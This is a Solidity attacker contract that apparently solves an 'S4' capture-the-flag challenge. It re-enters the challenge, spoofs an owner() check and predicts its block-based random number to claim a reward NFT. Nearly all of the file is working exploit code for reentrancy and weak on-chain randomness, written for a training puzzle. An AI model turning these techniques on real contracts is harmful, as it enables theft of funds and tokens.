// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title Minimal interface for the S4 challenge contract
 * @author kode-n-rolla
 * @notice Only the function used by the attacker is defined here.
 */
interface IS4 {
    /**
     * @notice Entry point of the challenge; if `guess` is correct, the registry mints an NFT.
     * @param guess The predicted RNG value expected by the challenge on the second entry.
     * @param yourTwitterHandle Free-form, may be empty; forwarded to the registry.
     */
    function solveChallenge(uint256 guess, string calldata yourTwitterHandle) external;
}

/**
 * @title S4 Reentrancy Solver
 * @notice Attacker contract that solves the S4 challenge by re-entering `solveChallenge`
 *         and computing the exact RNG within the same transaction.
 * @dev Key ideas:
 *      - `owner()` returns `address(this)` to satisfy S4's owner check via `staticcall`.
 *      - The first call arms the challenge and triggers `go()`.
 *      - Inside `go()`, we compute the same RNG as S4 using (address(this), prevrandao, timestamp)
 *        and re-enter with the correct `guess`.
 *      - Implements `IERC721Receiver` so `safeMint` succeeds, then exposes `sweep721` to move the NFT.
 */

 contract SolveContract is IERC721Receiver {
    /** @notice Address of the S4 challenge contract to attack. */
    address public immutable i_s4;

    /** @notice Externally Owned Account (EOA) that owns this attacker and receives swept NFTs. */
    address public immutable i_owner;

    /** @notice Optional Twitter handle forwarded to the registry (can be left as empty string). */
    string private constant TWITTER_HANDLE = "@your_twitter_handle";

    /**
     * @notice Emitted when the attacker computes the guess during `go()`.
     * @param guess The computed RNG guess (mod 1_000_000).
     * @param who The address used in the RNG input (this contract).
     * @param ts The block timestamp used for RNG.
     * @param rnd The block prevrandao used for RNG.
     */
    event DebugGuess(uint256 guess, address who, uint256 ts, uint256 rnd);

    /**
     * @notice Emitted when this contract receives an ERC-721 via safe transfer/mint.
     * @param nft The ERC-721 contract address.
     * @param tokenId The received token ID.
     * @param operator The caller (minter/registry).
     * @param from The previous owner (zero on mint).
     */
    event NftReceived(address nft, uint256 tokenId, address operator, address from);

    /**
     * @notice Emitted when an ERC-721 is swept out to the owner EOA.
     * @param nft The ERC-721 contract address.
     * @param tokenId The token ID being transferred.
     * @param to The EOA that receives the token (the contract owner).
     */
    event NftSwept(address nft, uint256 tokenId, address to);

    /**
     * @dev Restricts function to the deploying EOA (the beneficiary of the sweep).
     */
    modifier onlyOwner() {
        require(msg.sender == i_owner, "Not owner");
        _;
    }

    /**
     * @param _s4 Address of the target S4 challenge contract.
     */
    constructor(address _s4) {
        i_s4 = _s4;
        i_owner = msg.sender;
    }

    /**
     * @notice Starts the exploit sequence.
     * @dev First entry into S4: sets its internal flag and triggers a `call` to `go()`.
     *      The `guess` passed here is ignored by S4 in the first branch.
     */
    function solvingChallenge() external onlyOwner {
        IS4(i_s4).solveChallenge(0, TWITTER_HANDLE);
    }

    /**
     * @notice Returns this contract’s address.
     * @dev S4 performs `staticcall` to `msg.sender.owner()` and expects `owner() == msg.sender`.
     * @return The address of this contract.
     */
    function owner() external view returns (address) {
        return address(this);
    }

    /**
     * @notice Re-entrancy entrypoint called by S4 during the first attempt.
     * @dev Must only be callable by the S4 contract. Computes the RNG identically to S4
     *      (using the same block values and this contract’s address) and re-enters with the correct `guess`.
     * @return Always returns true; S4 only checks for success (no revert).
     */
    function go() external returns (bool){
        require(msg.sender == i_s4, "Only S4 can run");
        uint256 guess = computeGuess();

        emit DebugGuess(guess, address(this), block.timestamp, block.prevrandao);

        IS4(i_s4).solveChallenge(guess, TWITTER_HANDLE);
        return true;
    }

    /**
     * @notice Computes the same RNG that S4 uses in its second branch.
     * @dev Critical detail: use `address(this)` (the attacker) as `msg.sender` input to the hash.
     * @return The RNG modulo 1_000_000.
     */
    function computeGuess() internal view returns (uint256) {
        bytes32 guess = keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp));
        return uint256(guess) % 1_000_000;
    }

    /**
     * @inheritdoc IERC721Receiver
     * @dev Required to accept safe mints/transfers; emits a diagnostic event for visibility.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        emit NftReceived(msg.sender, tokenId, operator, from);
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
     * @notice Transfers an ERC-721 token held by this contract to the owner EOA.
     * @dev Use after a successful solve to move the reward NFT to your wallet.
     * @param nft The ERC-721 contract address.
     * @param tokenId The token ID to transfer.
     */
    function sweep721(address nft, uint256 tokenId) external onlyOwner {
        emit NftSwept(nft, tokenId, i_owner);
        IERC721(nft).safeTransferFrom(address(this), i_owner, tokenId);
    }
}
   
